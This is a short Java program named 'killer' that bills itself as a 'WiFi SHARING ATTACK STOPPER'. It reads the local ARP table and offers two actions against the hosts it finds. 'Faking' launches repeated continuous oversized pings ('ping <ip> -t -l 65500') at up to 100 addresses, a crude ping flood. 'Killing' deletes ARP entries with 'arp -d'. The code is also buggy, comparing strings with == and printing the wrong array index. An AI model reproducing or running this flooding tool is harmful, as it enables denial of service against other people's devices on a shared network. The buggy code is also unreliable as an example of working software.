import java.io.*;

public class killer
{
	public static void arpa(String command)
	{
		Console in = System.console();
		String ip[] = new String[10000];
		int i = 0,j = 0;
		System.out.println("\t\t ***WiFi SHARING ATTACK STOPPER***");
		try
		{
			Process p = Runtime.getRuntime().exec(command);
			BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
			String s = " ";
			
			while((s = inputStream.readLine())!=null)
			{
				/*if(s == null)
				{
					System.out.println("Break");
					break;
				}*/
				if(i > 3)
				{
					ip[j] = s.substring(2,17);
					System.out.println(ip[j]);
					j++;
					/*for(int h = 0;h < 100;h++)
					{
						Process pr = Runtime.getRuntime().exec("ping "+ip[j]+" -t -l 65500");	//Command to delete the network arp -d <IP-Address>
					}*/
				}
				if(s.startsWith("Interface") && i > 3)
				{
					break;
				}
				i++;
				//System.out.println(s);
			}
			System.out.print("Destination Address:");
			String dip = in.readLine();
			System.out.print("Action to be performed\n Faking\t Killing\n\t ");
			String des = in.readLine();
			if(des.equalsIgnoreCase("faking"))
			{
				for(int h = 0;h < 100;h++)
				{
					if(ip[h] == dip)
					{
						h++;
					}
					Process pr = Runtime.getRuntime().exec("ping "+ip[h]+" -t -l 65500");
				}
				System.out.print("Faking is done!!");
			}
			else if(des.equalsIgnoreCase("killing"))
			{
				for(int h = 0;h < 100;h++)
				{
					if(ip[h] == dip)
					{
						h++;
					}
					Process pr = Runtime.getRuntime().exec("arp -d "+ip[h]);
				}
				//System.out.print("Killing is done!!");
				Process print = Runtime.getRuntime().exec("arp -a");
				BufferedReader ipStream = new BufferedReader(new InputStreamReader(print.getInputStream()));
				String str = " ";
				String ipad[] = new String[10000];
				int x = 0,y = 0;
				while((str = ipStream.readLine())!=null)
				{
					if(x > 3)
					{
						ipad[y] = str.substring(2,17);
						System.out.println(ipad[j]);
						y++;
					}
					if(str.startsWith("Interface") && x > 3)
					{
						break;
					}
					x++;
				}
			}
		}
		catch(Exception e)
		{
			e.printStackTrace();
		}
		/*for(int k = 0;k < ip.length;k++)
		{
			System.out.println(ip[k]);
		}*/
	}
	/*public static void faking(String ipadr)
	{
		for(int h = 0;h < 100;h++)
		{
			if(ip[h] == ipadr)
			{
				h++;
			}
			Process pr = Runtime.getRuntime().exec("ping "+ip[h]+" -t -l 65500");
		}
	}
	
	public static void killing(String ipadr)
	{
		for(int h = 0;h < 100;h++)
		{
			if(ip[h] == ipadr)
			{
				h++;
			}
			Process pr = Runtime.getRuntime().exec("arp -d "+ip[h]);
		}
	}*/

	public static void main(String[] args)
	{
		arpa("arp -a");
	}
}